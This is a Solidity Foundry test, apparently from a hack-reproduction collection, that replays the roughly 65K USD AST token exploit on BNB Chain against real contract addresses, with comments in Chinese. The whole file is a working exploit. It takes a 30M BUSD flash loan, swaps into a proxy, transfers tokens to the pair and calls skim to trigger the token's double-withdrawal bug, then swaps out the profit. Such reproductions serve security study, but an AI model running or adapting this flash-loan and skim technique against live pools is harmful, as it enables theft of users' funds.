// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";


// @KeyInfo - Total Lost : 65K US$
// Attacker : 0x56f77AdC522BFfebB3AF0669564122933AB5EA4f
// Attack Contract : 0xaaE196b6E3f3Ee34405e857e7bfb05D74c5cf775
// Vulnerable Contract : 0xc10E0319337c7F83342424Df72e73a70A29579B2
// Attack Tx : https://bscscan.com/tx/0x80dd9362d211722b578af72d551f0a68e0dc1b1e077805353970b2f65e793927

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xc10e0319337c7f83342424df72e73a70a29579b2#code

// @Analysis
// solidityscan: https://blog.solidityscan.com/ast-token-hack-analysis-7a2f0400436a
// medium.com: https://medium.com/@joichiro.sai/ast-token-hack-how-a-faulty-transfer-logic-led-to-a-65k-exploit-da75aed59a43


// 需要在foundry.toml中设置 evm_version = 'shanghai'


contract ContractTest is Test {
    // AST接口
    address constant ast = 0xc10E0319337c7F83342424Df72e73a70A29579B2;
    // BUSD地址
    address constant busd = 0x55d398326f99059fF775485246999027B3197955;
    // WBNB地址
    address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    // ERC1967Proxy地址
    address constant proxy = 0xc8B9817eB65B7d7e85325f23A60D5839d14F9Ce4;
    // pancake BUSD/AST pair
    IPancakePair BUSD_AST_LPPool = IPancakePair(0x5ffEc8523A42BE78B1Ad1244fA526f14B64bA47a);
    // pancakeV3Pool接口
    IPancakeV3Pool PancakePool = IPancakeV3Pool(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    // pancackeRouter接口
    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    // 需要借款的BUSD数量
    uint256 constant busd_amount = 30_000_000 * 1e18;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        // 攻击发生的上一个区块
        vm.createSelectFork("bsc", 45_964_639);
        vm.label(busd, "BUSD");
        vm.label(ast, "AST");
        vm.label(address(BUSD_AST_LPPool), "BUSD_AST_LPPool");
        vm.label(address(PancakePool), "PancakePool");
        vm.label(address(pancakeRouter), "pancakeRouter");
        vm.label(address(proxy), "ERC1967Proxy");
        // 准备一点busd和ast，用于添加流动性
        deal(busd, address(this), 1 * 1e18);
        deal(ast, address(this), 7 * 1e18);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] Attacker BUSD balance before flash", IERC20(busd).balanceOf(address(this)), 18);
        address recipient = address(this);
        uint256 amount1 = 0;
        bytes memory data = abi.encode(busd_amount);
        // 调用闪电贷，贷款3000万个BUSD
        PancakePool.flash(recipient, busd_amount, amount1, data);
        emit log_named_decimal_uint("[Info] Attacker BUSD balance after exploit", IERC20(busd).balanceOf(address(this)), 18);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes memory data) external {
        emit log_named_decimal_uint("[Info] Attacker BUSD balance after flash", IERC20(busd).balanceOf(address(this)), 18);
        // 授权给pancakeRouter
        IERC20(busd).approve(address(pancakeRouter), type(uint256).max);
        IERC20(ast).approve(address(pancakeRouter), type(uint256).max);
        BUSD_AST_LPPool.approve(address(pancakeRouter), type(uint256).max);
        // 调用pancakeRouter把BUSD换成AST
        address[] memory path1 = new address[](2);
        path1[0] = busd;
        path1[1] = ast;

        // swap所有3000万个BUSD为AST，目标是proxy
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            busd_amount, 0, path1, proxy, block.timestamp
        );
        // 计算流动性池中的ast amount，使用LP中的Ast数量减1
        uint256 lpAstAmount = IERC20(ast).balanceOf(address(BUSD_AST_LPPool)) - 1;

        // 添加流动性，此处不能使用addLiquidity方法添加流动性，因为资产比例限制无法添加足额的AST
        IERC20(busd).transfer(address(BUSD_AST_LPPool), 1 * 1e18);
        IERC20(ast).transfer(address(BUSD_AST_LPPool), lpAstAmount);

        // 使用skim把多余代币提取到攻击合约中，也就是撤出上一步添加的流动性
        // 这里会触发合约的bug，LP中剩余AST数量为6688350004594453501，上一步添加了6688350004594453500
        // 由于合约BUG在撤出流动性时会撤出两次, 也就是 6688350004594453501 + 6688350004594453500 - 6688350004594453500 - 6688350004594453500 = 1
        BUSD_AST_LPPool.skim(address(this));
        BUSD_AST_LPPool.sync();
        emit log_named_decimal_uint("[Info] LP BUSD balance after skim", IERC20(busd).balanceOf(address(BUSD_AST_LPPool)), 18);
        emit log_named_decimal_uint("[Info] LP AST balance after skim", IERC20(ast).balanceOf(address(BUSD_AST_LPPool)), 18);
        // swap攻击合约中所有的AST
        address[] memory path2 = new address[](2);
        path2[0] = ast;
        path2[1] = busd;
        uint256 astAmount = IERC20(ast).balanceOf((address(this)));
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            astAmount, 0, path2, address(this), block.timestamp
        );
        // 解码data查看借贷总量，也可以像上边一样写死，这样就不需要依赖于data
        (uint256 amount) = abi.decode(data, (uint256));
        // 还款给pancake，并加上费用
        IERC20(busd).transfer(msg.sender, amount + fee0);
    }
}
